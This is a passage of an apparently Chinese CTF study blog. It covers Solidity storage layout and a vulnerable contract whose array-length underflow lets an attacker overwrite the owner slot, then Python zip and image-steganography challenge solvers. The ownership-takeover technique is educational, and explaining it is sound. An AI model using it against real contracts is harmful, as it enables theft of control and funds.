class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-code">|     unused (12)     |          owner (20)         | &lt;- slot 0</span><br><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-section">|                 randomNumber (32)                 | &lt;- slot 1</span><br><span class="hljs-section">-----------------------------------------------------</span><br><span class="hljs-section">|               safeboxes.length (32)               | &lt;- slot 2</span><br><span class="hljs-section">-----------------------------------------------------</span><br><span class="hljs-section">|       occupied by failedLogs but unused (32)      | &lt;- slot 3</span><br><span class="hljs-section">-----------------------------------------------------</span><br><br></code></pre></td></tr></table></figure><p>SafeBox与 FailedAttempt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity"># SafeBox <br>-----------------------------------------------------<br>| unused (11) | hash (12) | callback (8) | done (1) |<br>-----------------------------------------------------<br>|                     value (32)                    |<br>-----------------------------------------------------<br><br># FailedAttempt<br>-----------------------------------------------------<br>|                      idx (32)                     |<br>-----------------------------------------------------<br>|                     time (32)                     |<br>-----------------------------------------------------<br>|          origin (20)         |   triedPass (12)   |<br>-----------------------------------------------------<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function read_slot(uint k) public view returns (bytes32 res) &#123;<br>    assembly &#123; res := sload(k) &#125;<br>&#125;<br><br>function cal_addr(uint k, uint p) public pure returns(bytes32 res) &#123;<br>    res = keccak256(abi.encodePacked(k, p));<br>&#125;<br><br>function cal_addr(uint p) public pure returns(bytes32 res) &#123;<br>    res = keccak256(abi.encodePacked(p));<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract ArrayTest  &#123;<br><br>    address public owner;<br>    bool public contact;<br>    bytes32[] public codex;<br><br>    constructor() public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function record(bytes32 _content) public &#123;<br>        codex.push(_content);<br>    &#125;<br><br>    function retract() public &#123;<br>        codex.length--;<br>    &#125;<br><br>    function revise(uint i, bytes32 _content) public &#123;<br>        codex[i] = _content;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h5><p>数组codex 为slot1，实际内容存在keccak256(1)开始的位置。</p><p>x&#x3D;keccak256(bytes32(1)))</p><p>要想修改owner即要修改slot0，storage一共2^256个位置，因此需要修改codex[y]就等于修改owner。其中y&#x3D;2 ^256-x。</p><p>于此同时数组的长度还是要大于y的，但是retract()可以实现下溢。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 语法知识</title>
      <link href="/2023/10/31/Python-%E8%AF%AD%E6%B3%95%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/10/31/Python-%E8%AF%AD%E6%B3%95%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>一个完整的切片是包含三个参数和两个冒号” : “ ,用于分隔三个参数(start_index、end_index、step)。</p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>string.find( str, start, end)</p><ul><li>str ：（必选）指定需要检测的字符串</li><li>start ：（可选）开始索引，默认为0 <code>start = 0</code></li><li>end ：（可选）结束索引，默认为字符串的长度 <code>end = len(string)</code></li><li>如果「包含」字符串，就返回字符串的索引</li><li>如果「不包含」字符串，就返回 -1</li></ul><h3 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h3><p>lambda 表达式也叫做<strong>匿名函数</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">fun = <span class="hljs-keyword">lambda</span> x:x+<span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(fun(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h4 id="match"><a href="#match" class="headerlink" title="match"></a>match</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">re.<span class="hljs-keyword">match</span>(pattern, string)<br><span class="hljs-comment"># pattern     匹配的正则表达式</span><br><span class="hljs-comment"># string      要匹配的字符串</span><br></code></pre></td></tr></table></figure><h5 id="单字符匹配"><a href="#单字符匹配" class="headerlink" title="单字符匹配"></a>单字符匹配<img src="/../images/20211001104058570.png" alt="20211001104058570"></h5><p>[^2345] 不匹配2345中的任意一个</p><p>[a-z3-5] 匹配a-z或者3-5中的字符</p><h5 id="表示数量"><a href="#表示数量" class="headerlink" title="表示数量"></a>表示数量</h5><p><img src="/../images/20211001112641902.png" alt="20211001112641902"></p><h5 id="匹配边界"><a href="#匹配边界" class="headerlink" title="匹配边界"></a>匹配边界</h5><p><img src="/../images/20211001120752216.png" alt="20211001120752216"></p><h5 id="匹配分组"><a href="#匹配分组" class="headerlink" title="匹配分组"></a>匹配分组</h5><p><img src="/../images/20211001181501339.png" alt="20211001181501339"></p><h4 id="search"><a href="#search" class="headerlink" title="search"></a>search</h4><p>match差不多用法，从字符串中进行搜索</p><h4 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h4><p>从字面意思上就可以看到，findall是寻找所有能匹配到的字符，并以列表的方式返回</p><h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><p>对字符串进行分割，并返回一个列表</p><h3 id="列表与元组"><a href="#列表与元组" class="headerlink" title="列表与元组"></a>列表与元组</h3><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><p>列表所有元素都放在[]，中</p><p>使用append对列表进行更新</p><p>del删除列表中元素</p><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><p>count()</p><p>统计某个元素出现的次数</p><p>index()</p><p>查找某个元素再列表中首次出现的位置，即索引‘</p><p>remove() </p><p>一处某个值的首次匹配项</p><p>sort()</p><p>对列表中的元素进行排序</p><p>copy()</p><p>复制列表</p><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><p>所有元素放在（）中</p><p>元组中元素不能被修改，我们需要重新赋值，同理也只能删除整个元组</p><h5 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h5><p>len()</p><p>max(),min()</p><p>tuple()</p><p>将列表转为元组</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">l= [<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>]<br>t=<span class="hljs-built_in">tuple</span>(l)<br><span class="hljs-built_in">print</span>(t)<br><br><br>得到(<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python zip</title>
      <link href="/2023/10/31/Python-zip/"/>
      <url>/2023/10/31/Python-zip/</url>
      
        <content type="html"><![CDATA[<h3 id="zipfile"><a href="#zipfile" class="headerlink" title="zipfile"></a><strong>zipfile</strong></h3><h4 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h4><h5 id="ZipFile"><a href="#ZipFile" class="headerlink" title="ZipFile"></a>ZipFile</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> zipfile<br>f = zipfile.ZipFile(<span class="hljs-keyword">case</span>.<span class="hljs-built_in">zip</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-comment">#以可读方式创建一个ZipFile对象</span><br>f_name = f.namelist() <span class="hljs-comment">#获取zip对象内所有文件的名称列表</span><br>f_info = f.getinfo(name) <span class="hljs-comment">#获取zip对象内指定文件的信息</span><br>f_infolist = f.infolist() <span class="hljs-comment">#获取zip对象内所有文件的信息，返回列表</span><br>f.extract(name, path, pwd) <span class="hljs-comment">#解压zip对象内指定文件到指定路径中，密码为pwd</span><br>f.printdir() <span class="hljs-comment">#将zip对象内的信息打印到控制台上</span><br></code></pre></td></tr></table></figure><h5 id="Zipinfo"><a href="#Zipinfo" class="headerlink" title="Zipinfo"></a>Zipinfo</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> zipfile, os<br>zipFile = zipfile.ZipFile(os.path.join(os.getcwd(), <span class="hljs-string">&#x27;duoduo.zip&#x27;</span>))<br>zipInfo = zipFile.getinfo(<span class="hljs-string">&#x27;name&#x27;</span>) <span class="hljs-comment">#zip对象内的文件</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;filename:&#x27;</span>, zipInfo.filename)  <span class="hljs-comment">#获取文件名称</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;date_time:&#x27;</span>, zipInfo.date_time)   <span class="hljs-comment">#获取文件最后修改时间。返回一个包含6个元素的元组：(年, 月, 日, 时, 分, 秒)</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;compress_type:&#x27;</span>, zipInfo.compress_type) <span class="hljs-comment">#压缩类型</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;comment:&#x27;</span>, zipInfo.comment)   <span class="hljs-comment">#文档说明</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;extra:&#x27;</span>, zipInfo.extra)    <span class="hljs-comment">#扩展项数据</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;create_system:&#x27;</span>, zipInfo.create_system) <span class="hljs-comment">#获取创建该zip文档的系统。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;create_version:&#x27;</span>, zipInfo.create_version) <span class="hljs-comment">#获取 创建zip文档的PKZIP版本。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;extract_version:&#x27;</span>, zipInfo.extract_version) <span class="hljs-comment">#获取 解压zip文档所需的PKZIP版本。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;extract_version:&#x27;</span>, zipInfo.reserved) <span class="hljs-comment"># 预留字段，当前实现总是返回0。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;flag_bits:&#x27;</span>, zipInfo.flag_bits) <span class="hljs-comment">#zip标志位。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;volume:&#x27;</span>, zipInfo.volume) <span class="hljs-comment"># 文件头的卷标。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;internal_attr:&#x27;</span>, zipInfo.internal_attr) <span class="hljs-comment">#内部属性。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;external_attr:&#x27;</span>, zipInfo.external_attr) <span class="hljs-comment">#外部属性。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;header_offset:&#x27;</span>, zipInfo.header_offset) <span class="hljs-comment"># 文件头偏移位。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;CRC:&#x27;</span>, zipInfo.CRC) <span class="hljs-comment"># 未压缩文件的CRC-32。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;compress_size:&#x27;</span>, zipInfo.compress_size) <span class="hljs-comment">#获取压缩后的大小。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;file_size:&#x27;</span>, zipInfo.file_size) <span class="hljs-comment">#获取未压缩的文件大小。</span><br>zipFile.close() <br></code></pre></td></tr></table></figure><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="GDOUCTF-2023-Matryoshka"><a href="#GDOUCTF-2023-Matryoshka" class="headerlink" title="[GDOUCTF 2023]Matryoshka"></a>[GDOUCTF 2023]Matryoshka</h4><p>本题是一个压缩包套娃。</p><p>password1000.txt与Matryoshka1000.zip</p><p>其中每一层数字进行递减</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">eightfivezeroninefivetwosevenplusonesevenzerosevenfoursevensevenfourtwoplusfouronezerothreethreezerotimesthreefiveonesixfiveseveneighteightsevenplusfiveonesevennineonefivethreeeight<br></code></pre></td></tr></table></figure><p>密码为算出的结果。但是密码文件的运算逻辑不是平常做的那种。而是，固定下来，从左往右进行运算</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_password</span>(<span class="hljs-params">next_password_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(next_password_file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read().strip()<br>    replace_list = [[<span class="hljs-string">&quot;zero&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>], [<span class="hljs-string">&quot;one&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>], [<span class="hljs-string">&quot;two&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>], [<span class="hljs-string">&quot;three&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>],<br>                    [<span class="hljs-string">&quot;four&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>], [<span class="hljs-string">&quot;five&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>], [<span class="hljs-string">&quot;six&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>], [<span class="hljs-string">&quot;seven&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>],<br>                    [<span class="hljs-string">&quot;eight&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>], [<span class="hljs-string">&quot;nine&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>], [<span class="hljs-string">&quot;plus&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>], [<span class="hljs-string">&quot;times&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>],<br>                    [<span class="hljs-string">&quot;minus&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>], [<span class="hljs-string">&quot;mod&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>]]<br>    <span class="hljs-keyword">for</span> re_list <span class="hljs-keyword">in</span> replace_list:<br>        data = data.replace(re_list[<span class="hljs-number">0</span>], re_list[<span class="hljs-number">1</span>])<br><br>    nums = re.findall(<span class="hljs-string">r&quot;\d&#123;1,&#125;&quot;</span>, data)//匹配所有数字<br>    valid_nums = []<br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> nums:<br>        valid_nums.append(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(num)))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(nums)):<br>        data = data.replace(nums[i], valid_nums[i])//将数字转化为字符串，并将其添加到对应的位置<br><br>    list1 = [<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>]<br>    count_s = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> list1:<br>        counts = data.count(l)<br>        count_s += counts<br>    data = <span class="hljs-string">&#x27;(&#x27;</span> * count_s + data<br>    list2 = [[<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;)+&#x27;</span>], [<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;)-&#x27;</span>], [<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;)*&#x27;</span>], [<span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;)%&#x27;</span>]]<br>    <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> list2:<br>        data = data.replace(li[<span class="hljs-number">0</span>], li[<span class="hljs-number">1</span>])<br>    password = <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">eval</span>(data))<br>    <span class="hljs-keyword">return</span> password<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zip_file</span>(<span class="hljs-params">next_zip, password, next_password_file</span>):<br>    zf = zipfile.ZipFile(next_zip, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    name_list = zf.namelist()<br>    zf.extractall(path=<span class="hljs-string">&#x27;.&#x27;</span>, pwd=password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    zf.close()<br>    os.remove(next_password_file)<br>    os.remove(next_zip)<br>    next_password_file, next_zip = name_list[<span class="hljs-number">0</span>], name_list[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> next_password_file, next_zip<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    next_password_file = <span class="hljs-string">&#x27;password1000.txt&#x27;</span><br>    next_zip = <span class="hljs-string">&#x27;Matryoshka1000.zip&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            password = <span class="hljs-built_in">str</span>(get_password(next_password_file))<br>            next_password_file, next_zip = zip_file(next_zip, password, next_password_file)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/ManyQian/p/9193199.html">https://www.cnblogs.com/ManyQian/p/9193199.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 图像处理</title>
      <link href="/2023/10/30/Python-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"/>
      <url>/2023/10/30/Python-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="pillow"><a href="#pillow" class="headerlink" title="pillow"></a>pillow</h3><p>图片通常使用pillow库进行操作。</p><h4 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h4><h5 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>pic = Image.new(RGB,(width, height), (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)) <span class="hljs-comment">#新建一个图片文件</span><br><span class="hljs-comment">#不写颜色数据则默认为(0, 0, 0)</span><br><br>pic = Image.<span class="hljs-built_in">open</span>(data.png) <span class="hljs-comment">#打开一个图片文件</span><br>pic = Image.<span class="hljs-built_in">open</span>(data.png).convert(L) <span class="hljs-comment">#以灰度模式打开一个图片文件</span><br><br>width, height = pic.size <span class="hljs-comment">#获取图片的宽高</span><br>pic.putpixel((x,y),(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>)) <span class="hljs-comment">#对(x,y)坐标的像素点填充颜色，左上角坐标为(0, 0)</span><br><br>pic.show() <span class="hljs-comment">#用默认图片软件展示图片</span><br>pic.save() <span class="hljs-comment">#保存图片，可写路径，默认与python文件同路径</span><br></code></pre></td></tr></table></figure><p>提取一部分</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py">pic_1=pic.crop(x1,x2,y1,y2)<span class="hljs-comment">#前面为左上坐标，后边为右下角坐标</span><br><span class="hljs-comment">#一张照片分为多块保存。</span><br>a=<span class="hljs-number">30</span><br>b=<span class="hljs-number">45</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">80</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">80</span>):<br>        box=(x*a,y*b,(x+<span class="hljs-number">1</span>)*a,(y+<span class="hljs-number">1</span>)*b)<br>        f=image.crop(box)<span class="hljs-comment">#每块碎片为30*45</span><br>        f.save()<br><br></code></pre></td></tr></table></figure><h5 id="ImageDraw"><a href="#ImageDraw" class="headerlink" title="ImageDraw"></a><strong>ImageDraw</strong></h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> ImageDraw<br>pic = Image.new(RGB,(width, height),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>draw = ImageDraw.ImageDraw(pic)  <span class="hljs-comment">#创建绘画对象</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>fill &#x3D; fillColor ，填充颜色<br>outline &#x3D; outlineColor ， 边框颜色</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">draw.rectangle((x1,y1,x2,y2),fill = (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>),outline = (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br><span class="hljs-comment">#画一个矩形，必填参数为坐标，第一第二个为起始点坐标，第三第四个为终点坐标</span><br>draw.text((<span class="hljs-number">10</span>, <span class="hljs-number">10</span>), Hello, fill=(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>), font=<span class="hljs-literal">None</span>) <span class="hljs-comment">#画文字，文本左上角为x y坐标数据</span><br><br>draw.line(((<span class="hljs-number">60</span>,<span class="hljs-number">60</span>),(<span class="hljs-number">90</span>,<span class="hljs-number">60</span>))) <span class="hljs-comment">#画一条直线</span><br>draw.line(((<span class="hljs-number">60</span>,<span class="hljs-number">60</span>),(<span class="hljs-number">90</span>,<span class="hljs-number">60</span>), (<span class="hljs-number">90</span>,<span class="hljs-number">90</span>), (<span class="hljs-number">60</span>,<span class="hljs-number">90</span>), (<span class="hljs-number">60</span>,<span class="hljs-number">60</span>))) <br><span class="hljs-comment">#画多条直线，每条线的起点坐标就是上一条线的终点坐标，此例子就是4条直线围成一个正方形</span><br></code></pre></td></tr></table></figure><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="天翼杯-2021-rrrgggbbb"><a href="#天翼杯-2021-rrrgggbbb" class="headerlink" title="[天翼杯 2021]rrrgggbbb"></a>[天翼杯 2021]rrrgggbbb</h4><p>分别用StegSolve查看之后，发现分别r0、g0、b0通道的上方有像素点点。</p><p>抽出，发现&#96;&#96;BPG<code>头，并且有</code>THE END&#96;标志</p><p>需要把<code>THE END</code>标志及其之后的内容删掉</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>r=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rrr.png&quot;</span>)<br>g=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ggg.png&quot;</span>)<br>b=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;bbb.png&quot;</span>)<br><br>height = r.height<br>width = r.width<br><br>r_list = <span class="hljs-string">&quot;&quot;</span><br>g_list = <span class="hljs-string">&quot;&quot;</span><br>b_list = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        r_list += <span class="hljs-built_in">bin</span>(r.getpixel((x, y))[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)[<span class="hljs-number">7</span>]<br>        g_list += <span class="hljs-built_in">bin</span>(g.getpixel((x, y))[<span class="hljs-number">1</span>])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)[<span class="hljs-number">7</span>]                   <br>        b_list += <span class="hljs-built_in">bin</span>(b.getpixel((x, y))[<span class="hljs-number">2</span>])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)[<span class="hljs-number">7</span>]<br> <br>out=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out1.bpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span 